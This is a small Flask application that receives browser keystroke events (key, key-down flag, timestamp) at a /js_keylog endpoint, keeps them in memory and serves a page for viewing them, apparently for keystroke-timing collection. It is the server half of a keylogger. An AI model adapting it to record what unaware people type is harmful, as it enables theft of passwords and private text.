from flask import Flask, render_template, request, make_response, jsonify
import json
from json import JSONEncoder

keylog = []

class Key:
  def __init__(self, time, key_up, key):
    self.time = time
    self.key_up = key_up
    self.key = key

  def toJSON(self):
    return json.dumps(self, default=lambda o: o.__dict__, sort_keys=True, indent=4)


def generateJSON(statusCode, statusMessage, payload):
  return jsonify({
    "statusCode": statusCode,
    "statusMessage": statusMessage,
    "payload": payload
  })

  return 0

#start flask app
app = Flask(__name__)

@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/js_keylog', methods=['POST'])
def addLog():
  data = json.loads(request.data)

  for key in range(len(data)):
    print(data[key])
    time = data[key]['time']
    key_down = data[key]['key-down']
    key_pressed = data[key]['key']

    k = Key(time,key_down,key_pressed)
    keylog.append(k)

  return make_response(jsonify({'response': 'Success', 'code':200}), 200)

@app.route('/js_keylog', methods=['GET'])
def showKeylog():

  return render_template('js_keylog.html')

if __name__ == "__main__":
  app.run()
